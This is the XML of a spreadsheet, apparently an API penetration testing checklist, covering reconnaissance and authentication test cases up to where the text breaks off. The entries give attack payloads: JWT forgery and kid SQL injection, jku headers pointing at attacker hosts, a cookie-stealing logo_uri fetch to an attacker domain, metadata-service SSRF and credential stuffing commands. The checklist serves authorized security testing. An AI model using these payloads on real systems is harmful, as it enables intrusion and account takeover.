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Instructions" sheetId="1" state="visible" r:id="rId3"/>
    <sheet name="Master Checklist" sheetId="2" state="visible" r:id="rId4"/>
    <sheet name="Summary by Category" sheetId="3" state="visible" r:id="rId5"/>
    <sheet name="Summary by Severity" sheetId="4" state="visible" r:id="rId6"/>
    <sheet name="References" sheetId="5" state="visible" r:id="rId7"/>
  </sheets>
  <definedNames>
    <definedName function="false" hidden="true" localSheetId="1" name="_xlnm._FilterDatabase" vbProcedure="false">'Master Checklist'!$A$3:$I$298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<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="2639" uniqueCount="1617">
  <si>
    <t xml:space="preserve">API Penetration Testing Master Checklist</t>
  </si>
  <si>
    <t xml:space="preserve">2026 Edition — Deduplicated across 50+ sources + 2024-2026 cutting-edge research</t>
  </si>
  <si>
    <t xml:space="preserve">Coverage</t>
  </si>
  <si>
    <t xml:space="preserve">• 295 unique test cases across 23 categories</t>
  </si>
  <si>
    <t xml:space="preserve">• Full OWASP API Security Top 10 (2023) mapped: API1 (BOLA), API2 (Auth), API3 (BOPLA), API4 (Resource), API5 (BFLA), API7 (SSRF), API8 (Logging), API9 (Inventory), API10 (Unsafe Consumption)</t>
  </si>
  <si>
    <t xml:space="preserve">• Even coverage across protocols: REST, GraphQL, SOAP, gRPC, WebSocket</t>
  </si>
  <si>
    <t xml:space="preserve">• Niche &amp; emerging vectors: 0.CL/CL.0 desync (CVE-2025-32094, CVE-2025-4366), MadeYouReset HTTP/2 DoS (CVE-2025-55163), JSON parser differentials (Bishop Fox), single-packet race conditions (Kettle), server-side prototype pollution to RCE, gRPC Rapid Reset (CVE-2023-44487), web cache deception via path confusion</t>
  </si>
  <si>
    <t xml:space="preserve">• Sourced from: OWASP, PortSwigger Research, HackTricks, Bishop Fox, Salt Security, Escape.tech, F5 Labs, IBM, Wiz, Apisec, Levo, Praetorian, Black Hills, and 40+ other authoritative resources</t>
  </si>
  <si>
    <t xml:space="preserve">How to use</t>
  </si>
  <si>
    <t xml:space="preserve">1. Go to 'Master Checklist' — every test case has Test ID, Category, Test Case, Approach, Payloads/Tooling, References, Severity.</t>
  </si>
  <si>
    <t xml:space="preserve">2. Set status per test in column H via the dropdown (Not Started / In Progress / Pass / Fail / N/A). Conditional formatting colors the rows.</t>
  </si>
  <si>
    <t xml:space="preserve">3. Add evidence / notes / screenshots refs in column I.</t>
  </si>
  <si>
    <t xml:space="preserve">4. 'Summary by Category' and 'Summary by Severity' auto-update with COUNTIFS as you fill in Status.</t>
  </si>
  <si>
    <t xml:space="preserve">5. Filter the Master Checklist using the header autofilter to focus on a single category, severity, or status.</t>
  </si>
  <si>
    <t xml:space="preserve">6. Use 'References' for the full list of sources and links cited.</t>
  </si>
  <si>
    <t xml:space="preserve">Severity color legend</t>
  </si>
  <si>
    <t xml:space="preserve">Critical</t>
  </si>
  <si>
    <t xml:space="preserve">High</t>
  </si>
  <si>
    <t xml:space="preserve">Medium</t>
  </si>
  <si>
    <t xml:space="preserve">Low</t>
  </si>
  <si>
    <t xml:space="preserve">Info</t>
  </si>
  <si>
    <t xml:space="preserve">Disclaimer</t>
  </si>
  <si>
    <t xml:space="preserve">Use only on systems you are authorized to test. Several techniques (request smuggling, race conditions, DoS) can affect production infrastructure — restrict to staging or coordinate with the target's security team. Verify CVE applicability against actual library versions before reporting. Payloads are representative; tune to the specific stack.</t>
  </si>
  <si>
    <t xml:space="preserve">Master Checklist</t>
  </si>
  <si>
    <t xml:space="preserve">Set Status in column H. Filter using header row 3. Severity is color-coded.</t>
  </si>
  <si>
    <t xml:space="preserve">Test ID</t>
  </si>
  <si>
    <t xml:space="preserve">Category</t>
  </si>
  <si>
    <t xml:space="preserve">Test Case / Attack Vector</t>
  </si>
  <si>
    <t xml:space="preserve">Approach to Exploit</t>
  </si>
  <si>
    <t xml:space="preserve">Payloads / Tooling</t>
  </si>
  <si>
    <t xml:space="preserve">References</t>
  </si>
  <si>
    <t xml:space="preserve">Severity</t>
  </si>
  <si>
    <t xml:space="preserve">Status</t>
  </si>
  <si>
    <t xml:space="preserve">Notes / Evidence</t>
  </si>
  <si>
    <t xml:space="preserve">API-01-001</t>
  </si>
  <si>
    <t xml:space="preserve">API Reconnaissance &amp; Discovery</t>
  </si>
  <si>
    <t xml:space="preserve">Swagger / OpenAPI spec discovery</t>
  </si>
  <si>
    <t xml:space="preserve">Brute-force common spec paths to recover the full endpoint surface, including hidden /admin, /internal, /debug routes and unauthenticated endpoints not exposed in the UI. Parse the resulting JSON/YAML for sensitive operations and example payloads.</t>
  </si>
  <si>
    <t xml:space="preserve">Paths: /swagger.json, /openapi.json, /v2/api-docs, /api-docs, /.well-known/openapi, /swagger/v1/swagger.json | Tooling: autoswagger -u https://api.target.com</t>
  </si>
  <si>
    <t xml:space="preserve">github.com/intruder-io/autoswagger | OWASP WSTG</t>
  </si>
  <si>
    <t xml:space="preserve">Not Started</t>
  </si>
  <si>
    <t xml:space="preserve">API-01-002</t>
  </si>
  <si>
    <t xml:space="preserve">.well-known API catalog discovery</t>
  </si>
  <si>
    <t xml:space="preserve">Fetch IETF api-catalog and linkset (RFC 9264) endpoints to map service-desc, service-doc, and service-meta pointers to specs, Postman collections, and human-readable docs.</t>
  </si>
  <si>
    <t xml:space="preserve">GET /.well-known/api-catalog | GET /apis.json | Look for service-desc, service-doc, service-meta links</t>
  </si>
  <si>
    <t xml:space="preserve">danaepp.com/weaponizing-api-discovery-metadata</t>
  </si>
  <si>
    <t xml:space="preserve">API-01-003</t>
  </si>
  <si>
    <t xml:space="preserve">JavaScript file endpoint &amp; secret extraction</t>
  </si>
  <si>
    <t xml:space="preserve">Run static-analysis tools across minified JS bundles to extract API endpoints, paths, query parameters, and embedded secrets (API keys, JWTs, AWS keys).</t>
  </si>
  <si>
    <t xml:space="preserve">Tools: LinkFinder, JSluice, JSpector, JSMiner, getJS | grep -rE '(api[_-]?key|secret|token)' js/</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP WSTG</t>
  </si>
  <si>
    <t xml:space="preserve">API-01-004</t>
  </si>
  <si>
    <t xml:space="preserve">Wayback Machine historical endpoint mining</t>
  </si>
  <si>
    <t xml:space="preserve">Pull archived URLs from the Wayback Machine and Common Crawl to find deprecated-but-live endpoints, leaked tokens, and old API versions that may still be reachable.</t>
  </si>
  <si>
    <t xml:space="preserve">gau target.com | grep -iE '(api|v1|v2|v3|graphql|rest|json)' | sort -u | httpx -mc 200,401,403</t>
  </si>
  <si>
    <t xml:space="preserve">infosecwriteups.com - 5 Methods To Discover APIs</t>
  </si>
  <si>
    <t xml:space="preserve">API-01-005</t>
  </si>
  <si>
    <t xml:space="preserve">Google dorking for API specs</t>
  </si>
  <si>
    <t xml:space="preserve">Use search engine operators to locate exposed API documentation, Swagger UIs, and GraphQL playgrounds indexed publicly.</t>
  </si>
  <si>
    <t xml:space="preserve">site:target.com inurl:swagger-ui | intitle:"Swagger UI" site:target.com | site:target.com (inurl:swagger.json OR inurl:openapi.yaml)</t>
  </si>
  <si>
    <t xml:space="preserve">Google Hacking Database</t>
  </si>
  <si>
    <t xml:space="preserve">API-01-006</t>
  </si>
  <si>
    <t xml:space="preserve">Shodan / Censys Swagger and GraphQL discovery</t>
  </si>
  <si>
    <t xml:space="preserve">Search internet-wide scanner data for exposed Swagger UIs, GraphQL endpoints, and unauthenticated API gateways belonging to the target's ASN/domain.</t>
  </si>
  <si>
    <t xml:space="preserve">Shodan: http.title:"Swagger UI" org:"Target Inc" | http.html:"swagger-ui" | http.component:"Swagger"</t>
  </si>
  <si>
    <t xml:space="preserve">shodan.io | censys.io</t>
  </si>
  <si>
    <t xml:space="preserve">API-01-007</t>
  </si>
  <si>
    <t xml:space="preserve">GitHub / GitLab / Pastebin secret search</t>
  </si>
  <si>
    <t xml:space="preserve">Search public code repositories and paste sites for the organization's API keys, JWTs, OAuth secrets, and internal endpoint URLs leaked by developers.</t>
  </si>
  <si>
    <t xml:space="preserve">trufflehog github --org=target | gitleaks detect --source=. | GH search: 'api.target.com' filename:.env</t>
  </si>
  <si>
    <t xml:space="preserve">github.com/trufflesecurity/trufflehog | github.com/gitleaks/gitleaks</t>
  </si>
  <si>
    <t xml:space="preserve">API-01-008</t>
  </si>
  <si>
    <t xml:space="preserve">Subdomain enumeration for api.* hosts</t>
  </si>
  <si>
    <t xml:space="preserve">Enumerate subdomains and filter for API-specific naming patterns (api., gateway., graphql., internal., rpc.) to find lesser-known API hosts.</t>
  </si>
  <si>
    <t xml:space="preserve">amass enum -passive -d target.com | subfinder -d target.com | grep -E '(api|gw|graphql|grpc|rpc)' | httpx</t>
  </si>
  <si>
    <t xml:space="preserve">github.com/owasp-amass/amass | github.com/projectdiscovery/subfinder</t>
  </si>
  <si>
    <t xml:space="preserve">API-01-009</t>
  </si>
  <si>
    <t xml:space="preserve">Mobile app API extraction</t>
  </si>
  <si>
    <t xml:space="preserve">Decompile Android APKs / iOS IPAs and use dynamic instrumentation to extract base URLs, hardcoded API keys, certificate pinning bypasses, and undocumented endpoints.</t>
  </si>
  <si>
    <t xml:space="preserve">apktool d app.apk | jadx app.apk | frida -U -f com.target.app -l hook.js | mitmproxy with SSL pinning bypass</t>
  </si>
  <si>
    <t xml:space="preserve">frida.re | hacktricks - Android Pentesting</t>
  </si>
  <si>
    <t xml:space="preserve">API-01-010</t>
  </si>
  <si>
    <t xml:space="preserve">Postman / Insomnia collection leaks</t>
  </si>
  <si>
    <t xml:space="preserve">Search public Postman workspaces and Insomnia collections for the target organization to find leaked auth tokens, endpoint maps, and request examples.</t>
  </si>
  <si>
    <t xml:space="preserve">Postman search: 'target.com' or workspace name | Insomnia public workspace search</t>
  </si>
  <si>
    <t xml:space="preserve">postman.com/explore | danaepp.com</t>
  </si>
  <si>
    <t xml:space="preserve">API-01-011</t>
  </si>
  <si>
    <t xml:space="preserve">API-aware content brute force (Kiterunner)</t>
  </si>
  <si>
    <t xml:space="preserve">Use a verb-aware brute forcer that understands API routing patterns rather than treating endpoints as static directories. Catches POST-only and parameterized routes that dirb/gobuster miss.</t>
  </si>
  <si>
    <t xml:space="preserve">kr scan https://api.target.com -w routes-large.kite --fail-status-codes 401,403,404 -x 20</t>
  </si>
  <si>
    <t xml:space="preserve">github.com/assetnote/kiterunner | redfoxsec.com</t>
  </si>
  <si>
    <t xml:space="preserve">API-01-012</t>
  </si>
  <si>
    <t xml:space="preserve">Hidden parameter discovery</t>
  </si>
  <si>
    <t xml:space="preserve">Fuzz for undocumented GET, POST, and JSON parameters that may bypass authorization or unlock hidden functionality (debug, admin, internal flags).</t>
  </si>
  <si>
    <t xml:space="preserve">arjun -u https://api.target.com/v1/users/search --stable -m GET,POST,JSON | ParamSpider -d target.com</t>
  </si>
  <si>
    <t xml:space="preserve">github.com/s0md3v/Arjun</t>
  </si>
  <si>
    <t xml:space="preserve">API-01-013</t>
  </si>
  <si>
    <t xml:space="preserve">GraphQL endpoint discovery</t>
  </si>
  <si>
    <t xml:space="preserve">Probe common GraphQL paths with a universal query that succeeds on any valid endpoint. Append /v1 if the base path doesn't respond.</t>
  </si>
  <si>
    <t xml:space="preserve">Paths: /graphql, /api/graphql, /v1/graphql, /graphiql, /query, /altair | Query: {"query":"{__typename}"}</t>
  </si>
  <si>
    <t xml:space="preserve">portswigger.net/web-security/graphql</t>
  </si>
  <si>
    <t xml:space="preserve">API-01-014</t>
  </si>
  <si>
    <t xml:space="preserve">gRPC service enumeration via reflection</t>
  </si>
  <si>
    <t xml:space="preserve">Use the gRPC reflection service (if enabled) to list all services, methods, and message types — exposing the full RPC surface that the developer intended to be internal.</t>
  </si>
  <si>
    <t xml:space="preserve">grpcurl -plaintext host:port list | grpcurl -plaintext host:port describe &lt;Service&gt; | grpcurl -plaintext host:port describe .&lt;package&gt;.&lt;Message&gt;</t>
  </si>
  <si>
    <t xml:space="preserve">grpc.io/docs/guides/reflection</t>
  </si>
  <si>
    <t xml:space="preserve">API-01-015</t>
  </si>
  <si>
    <t xml:space="preserve">gRPC-web endpoint mapping from JS bundles</t>
  </si>
  <si>
    <t xml:space="preserve">Recover gRPC-web service definitions, methods, and message structures by parsing webpacked JS bundles, since the proto schema is partially embedded for client-side serialization.</t>
  </si>
  <si>
    <t xml:space="preserve">Tool: grpc-pentest-suite (gRPC-Scan) | Manually grep JS for .grpc.web.GrpcWebClientBase and methodInfo()</t>
  </si>
  <si>
    <t xml:space="preserve">github.com/nxenon/grpc-pentest-suite</t>
  </si>
  <si>
    <t xml:space="preserve">API-01-016</t>
  </si>
  <si>
    <t xml:space="preserve">WSDL enumeration for SOAP services</t>
  </si>
  <si>
    <t xml:space="preserve">Retrieve the WSDL to enumerate all SOAP operations, bindings, complex types, and example payloads. Often left publicly accessible even when the service requires auth.</t>
  </si>
  <si>
    <t xml:space="preserve">URLs: &lt;endpoint&gt;?wsdl | &lt;endpoint&gt;?WSDL | &lt;endpoint&gt;.asmx?WSDL | Use SoapUI or wsdler.py to parse</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP - Testing for Web Services</t>
  </si>
  <si>
    <t xml:space="preserve">API-01-017</t>
  </si>
  <si>
    <t xml:space="preserve">WebSocket endpoint discovery</t>
  </si>
  <si>
    <t xml:space="preserve">Proxy all browser traffic and look for HTTP/1.1 101 Switching Protocols responses to identify WebSocket endpoints, then note whether they use ws:// (cleartext) or wss://.</t>
  </si>
  <si>
    <t xml:space="preserve">Burp Proxy &gt; Filter: Show only WebSockets | Look for Upgrade: websocket headers in HTTP history</t>
  </si>
  <si>
    <t xml:space="preserve">portswigger.net/web-security/websockets</t>
  </si>
  <si>
    <t xml:space="preserve">API-01-018</t>
  </si>
  <si>
    <t xml:space="preserve">API version enumeration</t>
  </si>
  <si>
    <t xml:space="preserve">Iterate API version paths and Accept-version headers to discover deprecated versions that may lack security patches applied to the current version.</t>
  </si>
  <si>
    <t xml:space="preserve">Paths: /v1/, /v2/, /v3/, /api/v1/ | Headers: Accept-version: v1, API-Version: 2024-01-01</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP API Security Top 10 - API9:2023</t>
  </si>
  <si>
    <t xml:space="preserve">API-01-019</t>
  </si>
  <si>
    <t xml:space="preserve">HTTP verb enumeration</t>
  </si>
  <si>
    <t xml:space="preserve">Send an OPTIONS request to map allowed methods, then probe TRACE, PUT, PATCH, DELETE, COPY, MOVE, and custom methods to find the true allowed set vs documented set.</t>
  </si>
  <si>
    <t xml:space="preserve">curl -X OPTIONS https://api.target.com/v1/users -i | for m in GET POST PUT PATCH DELETE TRACE COPY; do curl -X $m ...; done</t>
  </si>
  <si>
    <t xml:space="preserve">RFC 7231 | OWASP WSTG</t>
  </si>
  <si>
    <t xml:space="preserve">API-01-020</t>
  </si>
  <si>
    <t xml:space="preserve">Header-based hidden feature fuzzing</t>
  </si>
  <si>
    <t xml:space="preserve">Fuzz request headers to find gated functionality enabled by internal/debug/admin headers that the gateway or application checks for.</t>
  </si>
  <si>
    <t xml:space="preserve">ffuf -u https://api.target.com/v1/admin -H 'X-Internal: FUZZ' -w internal-headers.txt | Try: X-Debug, X-Admin, X-Forwarded-Host, X-Original-URL</t>
  </si>
  <si>
    <t xml:space="preserve">PortSwigger Web Security Academy</t>
  </si>
  <si>
    <t xml:space="preserve">API-01-021</t>
  </si>
  <si>
    <t xml:space="preserve">Error message fingerprinting</t>
  </si>
  <si>
    <t xml:space="preserve">Send malformed requests (broken JSON, invalid content-type, unknown methods) to elicit verbose error responses that leak framework, version, and stack trace information.</t>
  </si>
  <si>
    <t xml:space="preserve">curl -X POST -H 'Content-Type: application/json' -d '{invalid' https://api.target.com/v1/users | curl /v1/users/[abc]</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP API Security Top 10 - API8:2023</t>
  </si>
  <si>
    <t xml:space="preserve">API-01-022</t>
  </si>
  <si>
    <t xml:space="preserve">Cloud storage URL discovery in responses</t>
  </si>
  <si>
    <t xml:space="preserve">Crawl API responses and grep for S3, GCS, and Azure Blob URLs referenced in JSON bodies. Public-readable buckets and predictable naming often follow.</t>
  </si>
  <si>
    <t xml:space="preserve">grep -rE '(s3\.amazonaws\.com|storage\.googleapis\.com|blob\.core\.windows\.net)' responses/</t>
  </si>
  <si>
    <t xml:space="preserve">github.com/sa7mon/S3Scanner</t>
  </si>
  <si>
    <t xml:space="preserve">API-01-023</t>
  </si>
  <si>
    <t xml:space="preserve">GraphQL schema recovery via introspection</t>
  </si>
  <si>
    <t xml:space="preserve">Run the full __schema introspection query to recover every type, field, argument, mutation, and subscription. Visualize the relationship graph for attack planning.</t>
  </si>
  <si>
    <t xml:space="preserve">Query: {__schema{types{name,fields{name,type{name,kind}}}}} | InQL Burp extension | GraphQL Voyager for visualization</t>
  </si>
  <si>
    <t xml:space="preserve">assetnote.io/resources/research/exploiting-graphql</t>
  </si>
  <si>
    <t xml:space="preserve">API-01-024</t>
  </si>
  <si>
    <t xml:space="preserve">GraphQL Clairvoyance schema recovery</t>
  </si>
  <si>
    <t xml:space="preserve">When introspection is disabled, abuse the field-suggestion error feature ("Did you mean…?") to brute-force valid field names character by character and rebuild the full schema.</t>
  </si>
  <si>
    <t xml:space="preserve">python3 -m clairvoyance https://api.target.com/graphql -w wordlist.txt -o schema.json | GraphQL Cop</t>
  </si>
  <si>
    <t xml:space="preserve">github.com/nikitastupin/clairvoyance</t>
  </si>
  <si>
    <t xml:space="preserve">API-01-025</t>
  </si>
  <si>
    <t xml:space="preserve">gRPC .proto recovery without reflection</t>
  </si>
  <si>
    <t xml:space="preserve">When reflection is disabled, recover the .proto schema from open-source repos, mobile bundles, or SDKs, then compile to a FileDescriptorSet and feed it to grpcurl.</t>
  </si>
  <si>
    <t xml:space="preserve">protoc --descriptor_set_out=svc.protoset --include_imports svc.proto | grpcurl -protoset svc.protoset -plaintext host:port describe</t>
  </si>
  <si>
    <t xml:space="preserve">grpcurl docs | github.com/protocolbuffers/protobuf</t>
  </si>
  <si>
    <t xml:space="preserve">API-01-026</t>
  </si>
  <si>
    <t xml:space="preserve">CORS origin-reflection recon</t>
  </si>
  <si>
    <t xml:space="preserve">Probe ACAO header reflection across origins to map trust relationships, partner domains, and any overly permissive origin matching that could enable cross-origin attacks.</t>
  </si>
  <si>
    <t xml:space="preserve">for origin in attacker.com null target.com.evil.com; do curl -H "Origin: $origin" -I https://api.target.com/v1/users; done</t>
  </si>
  <si>
    <t xml:space="preserve">portswigger.net/web-security/cors</t>
  </si>
  <si>
    <t xml:space="preserve">API-01-027</t>
  </si>
  <si>
    <t xml:space="preserve">Certificate transparency log discovery</t>
  </si>
  <si>
    <t xml:space="preserve">Search CT logs for certificates issued to api.*, internal.*, dev.*, staging.* subdomains of the target — including hosts not yet indexed by DNS enumeration tools.</t>
  </si>
  <si>
    <t xml:space="preserve">crt.sh?q=%25.target.com | curl 'https://crt.sh/?q=target.com&amp;output=json' | jq -r '.[].name_value' | sort -u</t>
  </si>
  <si>
    <t xml:space="preserve">crt.sh | certificate-transparency.org</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-001</t>
  </si>
  <si>
    <t xml:space="preserve">Authentication</t>
  </si>
  <si>
    <t xml:space="preserve">Credential stuffing against token endpoint</t>
  </si>
  <si>
    <t xml:space="preserve">Replay breached credential combos against the API token/login endpoint to find reused passwords. Verify whether rate limiting, account lockout, or anomaly detection trigger.</t>
  </si>
  <si>
    <t xml:space="preserve">Tools: hydra, Burp Intruder, snipr | Targets: /oauth/token, /api/login, /v1/auth | Wordlist: rockyou.txt + leaked combos</t>
  </si>
  <si>
    <t xml:space="preserve">owasp.org/www-community/attacks/Credential_stuffing</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-002</t>
  </si>
  <si>
    <t xml:space="preserve">JWT alg:none signature bypass</t>
  </si>
  <si>
    <t xml:space="preserve">Modify the JWT header to use the 'none' algorithm and strip the signature. Vulnerable libraries will accept the unsigned token as valid, allowing arbitrary claim forgery.</t>
  </si>
  <si>
    <t xml:space="preserve">Header: {"alg":"none","typ":"JWT"} | Tools: Burp JWT Editor, jwt_tool.py -X a, jwt.io</t>
  </si>
  <si>
    <t xml:space="preserve">portswigger.net/web-security/jwt</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-003</t>
  </si>
  <si>
    <t xml:space="preserve">JWT RS256 to HS256 algorithm confusion</t>
  </si>
  <si>
    <t xml:space="preserve">If the server has the same code path for symmetric and asymmetric validation, sign a forged token with HMAC-SHA256 using the public RSA key as the secret. The server validates HMAC against the public key it expected to use for RSA verification.</t>
  </si>
  <si>
    <t xml:space="preserve">python3 jwt_tool.py &lt;token&gt; -X k -pk public.pem | Burp JWT Editor &gt; Attack &gt; Algorithm confusion</t>
  </si>
  <si>
    <t xml:space="preserve">portswigger.net/web-security/jwt/algorithm-confusion</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-004</t>
  </si>
  <si>
    <t xml:space="preserve">JWT weak HMAC secret cracking</t>
  </si>
  <si>
    <t xml:space="preserve">Capture a valid HS256/HS384/HS512 JWT and offline-crack the signing secret with hashcat. Weak/default secrets (e.g., 'secret', 'changeme') and short keys are still common.</t>
  </si>
  <si>
    <t xml:space="preserve">hashcat -m 16500 jwt.txt rockyou.txt | john --format=HMAC-SHA256 jwt.txt</t>
  </si>
  <si>
    <t xml:space="preserve">github.com/ticarpi/jwt_tool</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-005</t>
  </si>
  <si>
    <t xml:space="preserve">JWT kid path traversal and SQL injection</t>
  </si>
  <si>
    <t xml:space="preserve">The kid (Key ID) header tells the server which key to load. Path-traverse to a known file like /dev/null (empty file = empty HMAC secret), or inject SQL if kid is looked up in a database.</t>
  </si>
  <si>
    <t xml:space="preserve">kid: "../../../dev/null" then sign with empty key | kid: "1' UNION SELECT 'attacker_key'--"</t>
  </si>
  <si>
    <t xml:space="preserve">jwtarsenal.com/knowledge-base/kid-injection</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-006</t>
  </si>
  <si>
    <t xml:space="preserve">JWT jku header injection</t>
  </si>
  <si>
    <t xml:space="preserve">Point the jku (JWK Set URL) header to an attacker-controlled JWKS endpoint hosting the public key paired with the attacker's private key. Bypasses loose URL allowlists (prefix/contains/regex checks).</t>
  </si>
  <si>
    <t xml:space="preserve">jku: https://attacker.ngrok.io/jwks.json | Host JWKS with attacker pubkey, sign with attacker privkey | Bypass: jku: https://target.com.attacker.com/jwks.json</t>
  </si>
  <si>
    <t xml:space="preserve">jwtarsenal.com/knowledge-base/jku-injection</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-007</t>
  </si>
  <si>
    <t xml:space="preserve">JWT embedded jwk key injection</t>
  </si>
  <si>
    <t xml:space="preserve">Embed the attacker's public key directly in the jwk JWT header parameter. Vulnerable implementations will use the supplied key to verify the signature instead of a trusted key.</t>
  </si>
  <si>
    <t xml:space="preserve">Header: {"alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"AQAB"}} | Burp JWT Editor &gt; Attack &gt; Embedded JWK</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-008</t>
  </si>
  <si>
    <t xml:space="preserve">JWT x5u / x5c certificate injection</t>
  </si>
  <si>
    <t xml:space="preserve">Inject an attacker-controlled X.509 chain via the x5u (URL) or x5c (embedded) headers. Equivalent to jku/jwk attacks but using X.509 instead of JWK format.</t>
  </si>
  <si>
    <t xml:space="preserve">x5u: https://attacker.com/cert-chain.pem | x5c: ["MIID...attacker-cert-base64..."]</t>
  </si>
  <si>
    <t xml:space="preserve">RFC 7515 §4.1.5-4.1.6</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-009</t>
  </si>
  <si>
    <t xml:space="preserve">JWT expired token reuse</t>
  </si>
  <si>
    <t xml:space="preserve">Replay a JWT after its exp claim has passed. OWASP API Security 2023 explicitly calls out servers that fail to validate token expiration as a Broken Authentication risk.</t>
  </si>
  <si>
    <t xml:space="preserve">Capture token, wait past exp, replay | jwt_tool.py &lt;token&gt; -T (tamper exp claim)</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP API Security Top 10 - API2:2023</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-010</t>
  </si>
  <si>
    <t xml:space="preserve">JWT claim tampering</t>
  </si>
  <si>
    <t xml:space="preserve">Modify identity claims (role, sub, aud, iss) and time claims (exp, nbf) and replay. Catches servers that decode but don't verify the signature, or that trust specific claims for authorization without re-validating.</t>
  </si>
  <si>
    <t xml:space="preserve">jwt_tool.py &lt;token&gt; -T | Modify: role:admin, sub:1, exp:9999999999, remove aud</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-011</t>
  </si>
  <si>
    <t xml:space="preserve">JWT cross-service token reuse</t>
  </si>
  <si>
    <t xml:space="preserve">In a microservice mesh, capture a token issued for service A and replay it against service B and C. Many implementations skip aud (audience) binding and accept any internally-issued token.</t>
  </si>
  <si>
    <t xml:space="preserve">Login at /service-a/login, capture token | Replay token at /service-b/admin, /service-c/internal</t>
  </si>
  <si>
    <t xml:space="preserve">traceable.ai - JWT attacks</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-012</t>
  </si>
  <si>
    <t xml:space="preserve">OAuth state parameter CSRF / session fixation</t>
  </si>
  <si>
    <t xml:space="preserve">Omit or reuse the OAuth state parameter to perform login CSRF (attacker logs victim into attacker's account, then victim adds payment method to attacker's account) or forced profile linking.</t>
  </si>
  <si>
    <t xml:space="preserve">Initiate OAuth flow, remove &amp;state= from authorize URL | Use attacker-fixed state value across victim sessions</t>
  </si>
  <si>
    <t xml:space="preserve">portswigger.net/web-security/oauth</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-013</t>
  </si>
  <si>
    <t xml:space="preserve">OAuth redirect_uri manipulation</t>
  </si>
  <si>
    <t xml:space="preserve">Bypass redirect_uri validation via path traversal, wildcard subdomain matching, open-redirect chaining, non-HTTPS callbacks, and auxiliary OIDC params (client_uri, logo_uri, initiate_login_uri).</t>
  </si>
  <si>
    <t xml:space="preserve">redirect_uri=https://target.com/oauth/../redirect?u=attacker.com | redirect_uri=https://target.com.attacker.com | logo_uri=javascript:fetch('//attacker/'+document.cookie)</t>
  </si>
  <si>
    <t xml:space="preserve">book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-014</t>
  </si>
  <si>
    <t xml:space="preserve">OAuth PKCE downgrade bypass</t>
  </si>
  <si>
    <t xml:space="preserve">Remove the code_challenge and code_challenge_method parameters from the authorization request. If the server still issues a code and accepts token exchange without code_verifier, PKCE enforcement is optional rather than mandatory (RFC 9700 §2.1.1 says SHOULD not MUST).</t>
  </si>
  <si>
    <t xml:space="preserve">Strip code_challenge from /authorize | Exchange code at /token without code_verifier</t>
  </si>
  <si>
    <t xml:space="preserve">RFC 9700 (OAuth 2.1 BCP) | datatracker.ietf.org/doc/html/rfc9700</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-015</t>
  </si>
  <si>
    <t xml:space="preserve">OAuth implicit flow token leakage</t>
  </si>
  <si>
    <t xml:space="preserve">When access_token appears in the URL fragment (#access_token=), chain an open redirect on an upstream page to exfiltrate the fragment to attacker.com via the Referer or by reflecting it into the page.</t>
  </si>
  <si>
    <t xml:space="preserve">response_type=token redirect_uri=https://target.com/redir?u=//attacker.com | Then attacker.com reads location.hash</t>
  </si>
  <si>
    <t xml:space="preserve">RFC 6819 - OAuth Threat Model</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-016</t>
  </si>
  <si>
    <t xml:space="preserve">OAuth dynamic client registration abuse</t>
  </si>
  <si>
    <t xml:space="preserve">POST to /register (RFC 7591) with a malicious jwks_uri, logo_uri, or redirect_uris. Used for SSRF, persistent redirect hijack, or to bypass client validation on registered-only clients.</t>
  </si>
  <si>
    <t xml:space="preserve">POST /register {"redirect_uris":["https://attacker.com"],"jwks_uri":"http://169.254.169.254/...","logo_uri":"http://internal:8080"}</t>
  </si>
  <si>
    <t xml:space="preserve">RFC 7591 | obsidiansecurity.com - OAuth research</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-017</t>
  </si>
  <si>
    <t xml:space="preserve">OAuth scope escalation on refresh</t>
  </si>
  <si>
    <t xml:space="preserve">Use a refresh_token to request broader scopes than originally consented to. Verify whether consent re-validation occurs and whether elevated scopes are silently granted.</t>
  </si>
  <si>
    <t xml:space="preserve">POST /token grant_type=refresh_token&amp;refresh_token=...&amp;scope=admin:write</t>
  </si>
  <si>
    <t xml:space="preserve">RFC 6749 §6</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-018</t>
  </si>
  <si>
    <t xml:space="preserve">OAuth client_secret brute force</t>
  </si>
  <si>
    <t xml:space="preserve">Bruteforce the client_secret against the IdP's /token endpoint. Common when service-provider secrets are reused, short, or guessable.</t>
  </si>
  <si>
    <t xml:space="preserve">POST /oauth/token grant_type=client_credentials&amp;client_id=known&amp;client_secret=FUZZ</t>
  </si>
  <si>
    <t xml:space="preserve">OAuth security BCP - RFC 9700</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-019</t>
  </si>
  <si>
    <t xml:space="preserve">OAuth account-merge account takeover</t>
  </si>
  <si>
    <t xml:space="preserve">Sign up with a federated identity (Google/GitHub) using the victim's email. If the server merges accounts on email match without verification, the attacker gains access to the victim's existing account.</t>
  </si>
  <si>
    <t xml:space="preserve">Register attacker@google with victim's email victim@target.com | Verify if account links to victim's existing account</t>
  </si>
  <si>
    <t xml:space="preserve">portswigger.net/web-security/oauth/account-takeover</t>
  </si>
  <si>
    <t xml:space="preserve">API-02-020</t>
  </si>
  <si>
    <t xml:space="preserve">SAML XML signature wrapping (XSW1-XSW8)</t>
  </si>
  <si>
